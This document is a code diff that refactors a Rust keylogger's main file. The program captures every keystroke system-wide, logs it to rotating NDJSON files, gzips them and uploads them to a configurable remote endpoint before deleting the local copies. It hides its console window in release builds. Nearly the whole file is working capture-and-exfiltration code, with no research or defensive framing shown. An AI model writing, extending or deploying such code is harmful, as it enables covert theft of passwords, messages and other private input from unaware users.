@@ -1,204 +1,206 @@
 #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 
-use std::{fs::File, io::{BufWriter, Read, Write}};
-use flate2::{write::GzEncoder, Compression};
-use rdev::{listen, Event};
-use reqwest::Client;
-use tokio::{select, sync::watch};
-use std::sync::{Arc, Mutex};
+use crate::keylog::{KeyLoggerHandle, KeylogEntry, spawn_keylogger};
+use anyhow::{Context, Result};
 use clap::Parser;
-use crate::keylog::{KeyAggregator, KeylogEntry};
+use flate2::{Compression, write::GzEncoder};
+use rdev::listen;
+use reqwest::Client;
+use std::{
+    path::{Path, PathBuf},
+    time::Duration,
+};
+use tokio::{
+    fs::{self, File, OpenOptions},
+    io::{AsyncWriteExt, BufWriter},
+    select,
+    sync::mpsc,
+};
 
 mod keylog;
 
-#[derive(Parser, Debug)]
+#[derive(Parser, Debug, Clone)]
 #[command(author, version, about, long_about = None)]
 struct Args {
     /// Upload endpoint URL
-    #[arg(short, long, default_value = "http://127.0.0.1:8080/api/upload")]
+    #[arg(long, default_value = "http://127.0.0.1:8080/api/upload")]
     url: String,
 
-    /// Output file path (without .current suffix)
+    /// Output file base path
     #[arg(short, long, default_value = "keylog.ndjson")]
-    output: String,
+    output: PathBuf,
 
     /// Upload interval in seconds
-    #[arg(short, long, default_value_t = 60)]
-    interval: u64,
+    #[arg(long, default_value_t = 60)]
+    upload_interval: u64,
 
-    /// Logger NDJSON save interval in milliseconds
-    #[arg(short, long, default_value_t = 60000)]
+    /// Aggregation interval in milliseconds (how often to write to disk)
+    #[arg(short, long, default_value_t = 60_000)]
     logger_interval: u64,
 
-    /// Enable debug mode with periodic uploads
+    /// Enable upload functionality
     #[arg(short, long, default_value_t = false)]
     debug: bool,
 }
 
+async fn open_log_file(path: &Path) -> Result<File> {
+    OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(path)
+        .await
+        .context("Failed to open log file")
+}
 
-fn append_entry<W>(
-    writer: &mut W,
-    entry: &KeylogEntry,
-) -> std::io::Result<()>
-where
-    W: Write
-{
-    let value = serde_json::to_string(&entry)?;
-    writer.write_all(format!("{}\n", value).as_bytes())?;
+async fn rotate_log_file(current_path: &Path) -> Result<Option<PathBuf>> {
+    if !current_path.exists() {
+        return Ok(None);
+    }
+
+    let metadata = fs::metadata(current_path).await?;
+    if metadata.len() == 0 {
+        return Ok(None);
+    }
+
+    let timestamp = chrono::Utc::now().format("%Y%m%d%H%M%S");
+    let file_stem = current_path
+        .file_stem()
+        .unwrap_or_default()
+        .to_string_lossy();
+    let extension = current_path
+        .extension()
+        .unwrap_or_default()
+        .to_string_lossy();
+
+    let pending_path =
+        current_path.with_file_name(format!("{}.{}.pending.{}", file_stem, timestamp, extension));
+
+    fs::rename(current_path, &pending_path)
+        .await
+        .context("Failed to rotate log file")?;
+
+    Ok(Some(pending_path))
+}
+
+async fn gzip_and_upload(url: String, file_path: PathBuf) -> Result<()> {
+    let content = fs::read(&file_path).await?;
+
+    let compressed = {
+        let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
+        std::io::Write::write_all(&mut encoder, &content)?;
+        encoder.finish()?
+    };
+
+    let client = Client::new();
+    let part = reqwest::multipart::Part::bytes(compressed)
+        .file_name("keylog.ndjson.gz")
+        .mime_str("application/gzip")?;
+
+    let form = reqwest::multipart::Form::new().part("file", part);
+
+    let response = client
+        .post(&url)
+        .multipart(form)
+        .send()
+        .await
+        .context("Failed to send request")?;
+
+    if !response.status().is_success() {
+        anyhow::bail!("Upload failed with status: {}", response.status());
+    }
+
+    fs::remove_file(&file_path)
+        .await
+        .context("Failed to delete uploaded file")?;
+    println!("Upload successful. Deleted local artifact.");
+
     Ok(())
 }
 
-fn create_callback(
-    logger_interval: std::time::Duration,
-    mut writer: BufWriter<File>,
-    flush_signal: Arc<Mutex<bool>>
-) -> Box<dyn FnMut(Event) + Send> {
-    let aggregator = KeyAggregator::new(logger_interval);
-    let (aggregator, rx) = aggregator.start_keylogger_processor();
-
-    std::thread::spawn(move || {
-        while let Ok(entry) = rx.recv() {
-            if let Err(e) = append_entry(&mut writer, &entry) {
-                eprintln!("Failed to write to file: {}", e);
+async fn run_persistence_loop(args: Args, mut rx: mpsc::Receiver<KeylogEntry>) -> Result<()> {
+    let mut writer = BufWriter::new(open_log_file(&args.output).await?);
+    let mut upload_interval = tokio::time::interval(Duration::from_secs(args.upload_interval));
+    loop {
+        select! {
+            maybe_entry = rx.recv() => {
+                match maybe_entry {
+                    Some(entry) => {
+                        let json = serde_json::to_string(&entry)?;
+                        writer.write_all(json.as_bytes()).await?;
+                        writer.write_all(b"\n").await?;
+                        writer.flush().await?;
+                    }
+                    None => {
+                        println!("Keylogger channel closed.");
+                        break;
+                    }
+                }
             }
 
-            if let Err(e) = writer.flush() {
-                eprintln!("Failed to flush file: {}", e);
-            }
+            _ = upload_interval.tick(), if args.debug => {
+                if let Err(e) = writer.flush().await {
+                    eprintln!("Error flushing buffer before rotation: {}", e);
+                }
 
-            if let Ok(mut signal) = flush_signal.lock() {
-                *signal = true;
+                drop(writer);
+
+                match rotate_log_file(&args.output).await {
+                    Ok(Some(pending_path)) => {
+                        let url = args.url.clone();
+                        tokio::spawn(async move {
+                            if let Err(e) = gzip_and_upload(url, pending_path).await {
+                                eprintln!("Upload task failed: {:?}", e);
+                            }
+                        });
+                    }
+                    Ok(None) => { /* Nothing to upload */ }
+                    Err(e) => eprintln!("Failed to rotate logs: {:?}", e),
+                }
+
+                writer = BufWriter::new(open_log_file(&args.output).await?);
             }
         }
-    });
-
-    let cb = move |event: Event| {
-        if let Ok(mut agg) = aggregator.lock() {
-            let _ = agg.process_event(event);
-        }
-    };
-
-    Box::new(cb)
-}
-
-fn gzip_file_to_vec(path: &str) -> anyhow::Result<Vec<u8>> {
-    let mut input = File::open(path)?;
-    let mut buf = Vec::new();
-
-    input.read_to_end(&mut buf)?;
-
-    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
-    encoder.write_all(&buf)?;
-    let compressed = encoder.finish()?;
-    Ok(compressed)
-}
-
-async fn upload_keylog(
-    url: &str,
-    path: &str,
-) -> anyhow::Result<()> {
-    let compressed = gzip_file_to_vec(path)?;
-
-    let form = reqwest::multipart::Form::new()
-        .part("file", reqwest::multipart::Part::bytes(compressed)
-            .file_name("keylog.ndjson.gz")
-            .mime_str("application/gzip")?);
-
-    let response = Client::new()
-        .post(url)
-        .multipart(form)
-        .send()
-        .await?;
-
-    if !response.status().is_success() {
-        return Err(anyhow::anyhow!(
-            "Failed to upload file: {}",
-            response.status()
-        ));
     }
+
     Ok(())
 }
 
 #[tokio::main]
-async fn main() -> anyhow::Result<()> {
+async fn main() -> Result<()> {
     let args = Args::parse();
-
-    let current_file = format!("{}.current", args.output);
-    let file = File::options()
-        .create(true)
-        .append(true)
-        .open(&current_file)?;
-    let writer = BufWriter::new(file);
-
-    println!("Keylogger started");
-    println!("Output file: {}", current_file);
-    if args.debug {
-        println!("Debug mode: enabled");
-        println!("Upload URL: {}", args.url);
-        println!("Upload interval: {} seconds", args.interval);
-        println!("Logger interval: {} ms", args.logger_interval);
-    }
-
-    let flush_signal = Arc::new(Mutex::new(false));
-    let callback = create_callback(
-        std::time::Duration::from_millis(args.logger_interval),
-        writer,
-        flush_signal.clone()
+    println!("Starting Keylogger...");
+    println!(
+        "Aggregation: {}ms | Upload: {}s",
+        args.logger_interval, args.upload_interval
     );
-    let (stop_tx, mut stop_rx) = watch::channel(false);
 
-    if args.debug {
-        let url = args.url.clone();
-        let path = args.output.clone();
-        let current_file_clone = current_file.clone();
+    let KeyLoggerHandle {
+        event_tx,
+        report_rx,
+        thread_handle,
+    } = spawn_keylogger(Duration::from_millis(args.logger_interval));
 
-        let send_thread = tokio::spawn(async move {
-            let mut tick = tokio::time::interval(std::time::Duration::from_secs(args.interval));
-
-            loop {
-                select! {
-                    _ = tick.tick() => {
-                        let should_upload = if let Ok(mut signal) = flush_signal.lock() {
-                            let should = *signal
-                                && std::path::Path::new(&current_file_clone)
-                                    .metadata()
-                                    .map(|m| m.len())
-                                    .unwrap_or(0)
-                                    > 0;
-                            *signal = false;
-                            should
-                        } else {
-                            false
-                        };
-
-                        if should_upload {
-                            println!("Preparing to upload keylog...");
-                            if let Err(e) = std::fs::copy(&current_file_clone, &path) {
-                                eprintln!("Failed to copy current file: {}", e);
-                            } else if let Err(error) = upload_keylog(&url, &path).await {
-                                eprintln!("Upload error: {:?}", error);
-                            }
-                        }
-                    }
-                    _ = stop_rx.changed() => {
-                        if *stop_rx.borrow() {
-                            println!("Stopping upload thread...");
-                            break;
-                        }
-                    }
-                }
-            }
-        });
-
-        if let Err(error) = listen(callback) {
-            eprintln!("Listen error: {:?}", error);
+    let manager_args = args.clone();
+    let manager_handle = tokio::spawn(async move {
+        if let Err(e) = run_persistence_loop(manager_args, report_rx).await {
+            eprintln!("Persistence loop crashed: {:?}", e);
         }
-        stop_tx.send(true)?;
-        send_thread.await?;
-    } else if let Err(error) = listen(callback) {
-        eprintln!("Listen error: {:?}", error);
+    });
+
+    let tx = event_tx.clone();
+    if let Err(error) = listen(move |event| {
+        let _ = tx.send(event);
+    }) {
+        eprintln!("Input listener error: {:?}", error);
     }
 
-    println!("Keylogger stopped");
+    println!("Input listener stopped. Shutting down...");
+    drop(event_tx);
+
+    if let Err(e) = thread_handle.join() {
+        eprintln!("Aggregator thread finished with panic: {:?}", e);
+    }
+
+    let _ = manager_handle.await;
     Ok(())
 }
